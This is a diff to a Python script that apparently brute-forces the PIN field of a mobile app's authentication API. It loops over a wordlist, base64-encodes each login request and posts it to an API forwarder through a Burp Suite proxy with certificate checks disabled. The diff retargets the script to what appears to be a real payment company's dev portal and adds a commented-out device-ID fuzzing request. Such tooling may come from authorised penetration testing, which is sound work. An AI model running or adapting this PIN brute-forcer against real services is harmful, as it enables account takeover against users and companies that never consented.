@@ -23,10 +23,7 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
     
-http_proxy = "http://127.0.0.1:8080"
-proxies = {
-              "http" : http_proxy
-            }
+listproxies = {"http": "127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 headers = {
     'Host': 'app.customer.co.za',
@@ -64,6 +61,7 @@ for line in Lines:
 	print(f"{bcolors.ENDC}")
 
 	RawPOSTData = r'{"uri":"CUS:Authentication/authenticateUser?Mobile=059966595","httpMethod":"post","request":"{\"os\":\"android\",\"osVersion\":\"10\",\"deviceId\":\"2debe904a24996f9\",\"appName\":\"za.com.customer.mobileapp\",\"appVersion\":\"1.0.45\",\"mobile\":\"0459966595\",\"pin\":\"FUZZER\"}"}'
+	# RawPOSTData = r'{"uri":"CUS:Device/isDeviceRegistered","httpMethod":"post","request":"{\"DeviceId\":\"FUZZER\",\"AppName\":\"au.com.creditcorp.wizit\"}"}'
 	
 	print(f"{bcolors.ENDC}[i]  Raw POST Data {bcolors.ENDC}")
 	print(RawPOSTData, "\n")
@@ -79,7 +77,7 @@ for line in Lines:
 	print(f"{bcolors.OKCYAN}[i]  Base64 Payload {bcolors.ENDC}")
 	print(payload, "\n")
 
-	response = requests.post('https://app.customer.co.za/api/forwarder', headers=headers, data=payload, proxies=proxies, verify=False) 
+	response = requests.post('https://dev2portal.wizpay.com.au/api/forwarder', headers=headers, data=payload, proxies=listproxies, verify=False) # proxies=Burp Suite
 
 	print(f"{bcolors.OKGREEN}[o]  Response Status Code {bcolors.ENDC}")
 	print(response.status_code)
@@ -88,9 +86,13 @@ for line in Lines:
 	print(f"{bcolors.OKGREEN}",response.headers)
 	print(f"{bcolors.ENDC}")
 
-	print(f"{bcolors.WARNING}[o] Response JSON {bcolors.ENDC}")
-	pretty_json = json.dumps( response.json() , indent=4)
-	print(f"{bcolors.WARNING}",pretty_json)
+	print(f"{bcolors.WARNING}[o] Response JSON {bcolors.ENDC}")	
+	try:
+		pretty_json = json.dumps( response.json() , indent=4)
+		print(f"{bcolors.WARNING}",pretty_json)
+	except ValueError:
+		print('Decoding JSON has failed')
+
 	print(f"{bcolors.ENDC}")
 
 	time.sleep(1)  # optimize the code.... reduce the sleep time LOL
